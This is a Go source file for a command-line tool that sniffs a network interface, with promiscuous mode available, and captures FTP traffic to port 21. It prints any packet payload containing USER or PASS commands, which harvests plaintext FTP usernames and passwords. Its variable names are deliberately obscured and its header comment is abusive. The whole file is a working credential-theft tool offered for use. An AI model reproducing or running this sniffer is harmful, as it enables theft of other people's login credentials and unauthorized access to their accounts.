/*

Package => main

Developer => ArkAngel43

Tool Type => CLI

Tool va => bma

Tool li => A1, MA2, $m2, Pe8

if you dont understand by now get the fuck out of the code

Tool intf => expos68

Script:
	Captures specific FTP based data


	i didnt plan on making this fancy, there really was no need
	when literally all the fancy stuff was done with and all i needed to do
	was make a secondary reliable source

*/
package main

import (
	"bytes"
	"flag"
	"fmt"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

var (
	i_a1_b2_m6      = flag.String("intgs", "", "int")
	len_a1          = int32(1600)
	pro_a5          = flag.Bool("prom", false, "")
	to_a5tom6       = pcap.BlockForever
	ft_ler_m98_toa1 = "tcp and dst port 21"
	f_de_V          = false
)

func ce_mod1_to_mod6(err error, log_type int, msg string, exit_code int) bool {
	if err != nil {
		if log_type == 1 {
			log.Fatal(err, msg)
			return true
		}
		if log_type == 3 {
			panic(err)
		}
		if log_type == 98 {
			fmt.Println(err, msg)
			return true
		}
	} else {
		return false
	}
	return false
}

func main() {
	flag.Parse()
	dev, err := pcap.FindAllDevs()
	ce_mod1_to_mod6(err, 1, "error during cap for find all devices on line 62 during run main func", 1)
	for _, dev_a1 := range dev {
		if dev_a1.Name == *i_a1_b2_m6 {
			f_de_V = true
		}
	}
	listen, err2 := pcap.OpenLive(*i_a1_b2_m6, len_a1, *pro_a5, to_a5tom6)
	fmt.Println("[ info ] [ base ] [ ftp ] Listening...")
	ce_mod1_to_mod6(err2, 1, "", 1)
	defer listen.Close()
	if err := listen.SetBPFFilter(ft_ler_m98_toa1); err != nil {
		log.Panicln(err)
	}
	source := gopacket.NewPacketSource(listen, listen.LinkType())
	for packet := range source.Packets() {
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}
		payload := appLayer.Payload()
		if bytes.Contains(payload, []byte("USER")) {
			fmt.Print(string(payload))
		} else if bytes.Contains(payload, []byte("PASS")) {
			fmt.Print(string(payload))
		}
		fmt.Println(packet)
	}

}
